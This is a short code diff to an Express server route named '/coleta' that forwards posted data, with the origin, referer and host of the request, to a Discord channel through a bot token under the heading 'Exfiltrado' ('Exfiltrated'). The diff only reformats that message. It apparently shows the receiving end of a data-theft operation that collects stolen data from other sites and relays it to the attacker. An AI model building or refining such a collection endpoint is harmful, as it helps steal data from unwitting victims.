@@ -242,7 +242,15 @@ app.post('/coleta', async (req, res) => {
       'Authorization': `Bot ${process.env.DC_BotToken}`,
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify({ content: `# Exfiltrado \n\n ## Origin: \n${req.headers?.origin ? req.headers.origin : 'Não especificado'} \n\n ## Refer: \n${req.headers?.refer ? req.headers.refer : 'Não especificado'} \n\n ## Host: \n${req.headers?.host ? req.headers.host : 'Não especificado'} \n\n ## Hostname: \n${req.headers?.hostname ? req.headers.hostname : 'Não especificado'} \n\n ## Data: \n \`\`\`\n${JSON.stringify(data, null, 4)}\`\`\`` })
+    body: JSON.stringify({ content: `
+# Exfiltrado \n
+
+## Origin: \n${req.headers?.origin ? req.headers.origin : 'Não especificado'} \n
+## Refer: \n${req.headers?.refer ? req.headers.refer : 'Não especificado'} \n
+## Host: \n${req.headers?.host ? req.headers.host : 'Não especificado'} \n
+## Hostname: \n${req.headers?.hostname ? req.headers.hostname : 'Não especificado'} \n
+
+## Data: \n \`\`\`\n${JSON.stringify(data, null, 4)}\`\`\`` })
   });
 
   res.status(204).end();
